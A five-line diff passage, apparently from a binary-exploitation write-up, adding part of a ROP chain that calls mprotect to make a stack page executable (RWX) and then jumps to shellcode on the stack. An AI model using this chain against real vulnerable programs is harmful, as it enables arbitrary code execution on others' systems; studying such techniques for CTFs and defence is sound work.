@@ -1,0 +1,5 @@
+x1000)               # size
+  rop += p64(pop_rdx) + p64(7)                    # RWX
+  rop += p64(mprotect)                            # mprotect(stack, 0x1000, 7)
+  rop += p64(stack_addr + 0x100)                  # jump to shellcode on stack
+  ```
